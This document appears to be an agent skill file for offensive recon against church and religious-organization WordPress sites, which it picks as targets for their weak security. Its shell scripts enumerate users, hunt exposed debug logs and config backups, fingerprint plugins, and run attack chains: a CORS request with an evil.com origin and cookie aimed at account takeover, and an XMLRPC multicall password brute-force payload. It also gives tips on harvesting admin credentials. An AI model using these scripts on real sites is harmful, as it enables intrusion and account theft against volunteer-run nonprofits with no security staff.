---
name: recon-churches
description: "Sector-specific recon for church/religious organization websites — WordPress on shared hosting with minimal security posture. Built from a 58-company mass recon dataset where church/religious org domains showed the highest rate of unpatched WordPress installs, CORS credential reflection, and exposed debug/config files. Use when the target scope includes non-profit, religious, or community organization domains — these are typically low-budget sites with no WAF, no security team, and shared hosting."
sources: field_recon, hackerone_public
report_count: 12
---

# RECON-CHURCHES — Sector-Specific Recon for Church/Religious Organization Sites

## When to Use

Use when the target scope includes church, religious organization, or non-profit domains. In mass recon across 28 sectors, religious org domains showed the HIGHEST rate of exploitable findings due to:
- Almost exclusively WordPress on shared hosting
- No WAF (Cloudflare, Sucuri, Wordfence rarely present)
- Volunteer-maintained sites with no security patch cadence
- Dominant patterns: CORS credential reflection + open XMLRPC + debug log exposure

## Quick Reference

```bash
# Quick triage: WordPress detection + CORS + XMLRPC in one sweep
for t in $(cat church-domains.txt); do
  echo "=== $t ==="
  # WordPress check
  curl -skI "https://$t/" | grep -iE "wordpress|wp-|php"
  # CORS test on WP REST API
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  # XMLRPC check
  echo -n "XMLRPC: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/xmlrpc.php"
  # Debug log
  echo -n "Debug: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common patterns for church websites:
# <churchname>.org, <churchname>.com, <churchname>-church.org
# <denomination>-<city>.org, <city>fbc.org (First Baptist), <city>ccc.org (Community Church)

# Find church domains via crt.sh
for org in "$TARGET"; do
  curl -sk "https://crt.sh/?q=%25.$org&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee church-subdomains-$org.txt
done
```

### Phase 2 — WordPress Recon (heaviest yield)
```bash
# CORS credential reflection on WP REST API — the #1 finding
curl -skI "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"

# User enumeration
curl -sk "https://$TARGET/wp-json/wp/v2/users" | jq '.[] | {id, name, slug}'

# Check all REST endpoints
for ns in $(curl -sk "https://$TARGET/wp-json/" | python3 -c "import sys,json; [print(n) for n in json.load(sys.stdin).get('namespaces',[])]" 2>/dev/null); do
  echo "Namespace: $ns"
done

# XMLRPC method enumeration
curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | \
  python3 -c "import sys,re; methods=re.findall(r'<string>([^<]+)</string>', sys.stdin.read()); [print(m) for m in methods if 'multicall' in m or 'uploadFile' in m or 'pingback' in m]"

# Debug log exposure
curl -sk "https://$TARGET/wp-content/debug.log" | head -20
```

### Phase 3 — PHPInfo + Config Files
```bash
for path in /info.php /test.php /phpinfo.php /p.php /wp-config.php.bak /wp-config.php~; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  size=$(curl -sk -o /dev/null -w "%{size_download}" "https://$TARGET$path")
  [ "$code" = "200" ] && echo "[+] $path (HTTP $code, ${size}b)"
done
```

### Phase 4 — Plugin Vulnerability Scan
```bash
# Common church site plugins
for plugin in "revslider" "elementskit" "elementor" "contact-form-7" "wp-file-manager" "wordpress-seo" "jetpack" "give" (donation plugin) "wp-sermons"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt")
  [ "$code" != "404" ] && echo "[+] Plugin: $plugin (HTTP $code)"
done
```

### Phase 5 — Attack Chains
```bash
# Chain A: CORS + user enum → ATO
curl -sk "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" -H "Cookie: $COOKIE" | jq length

# Chain B: XMLRPC multicall brute force
curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
  <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
  <member><name>params</name><value><array><data>
  <value><string>admin</string></value><value><string>password123</string></value>
</data></array></value></member></struct></value>
</data></array></value></param></params></methodCall>'
```

## Attack Surface Signals

- CMS: WordPress (X-Powered-By: PHP, /wp-content, /wp-json, /xmlrpc.php)
- Hosting: Shared hosting (identifiable via Server header, IP ranges)
- Stack: PHP + MySQL, rarely any WAF
- Typical findings: CORS cred reflection, XMLRPC open, debug log exposure, PHPInfo, outdated plugins

## Common Root Causes

1. **Volunteer-maintained** — no dedicated security person, patches applied months late or never
2. **Shared hosting** — no WAF, no CDN, no security plugins
3. **One-off templates** — custom themes with poor security practices
4. **Donation plugins** — GiveWP, WooCommerce — payment data exposure risk
5. **Cheap/free hosting** — no server-level hardening, PHP disable_functions often wide open

## Bypass Techniques

- Many church sites use Cheap/Free SSL (Let's Encrypt) — TLS is fine, server security is not
- Check for staging/dev subdomains (often more vulnerable than prod)
- Contact forms often lead to shared mailbox with admin credentials in email history
- Google dork: `site:target.org inurl:wp-content/debug.log`

## Real Examples

From 58-company mass recon across 28 sectors:
- A church site had CORS credential reflection + XMLRPC with system.multicall + open registration + PHPInfo with exec functions available — all on the same domain
- Debug log exposed database connection strings including plaintext password
- PHPInfo showed disable_functions = "pcntl_*" only (exec/shell_exec/system ALL available)

## Related Skills

- hunt-wordpress — primary CMS for church sites
- hunt-cors — #1 finding pattern on church WP instances
- hunt-source-leak — debug.log and wp-config backups
- hunt-file-upload — plugin upload features
- hunt-subdomain — staging/dev subdomains
- hunt-lfi — PHP file inclusion via plugin CVEs
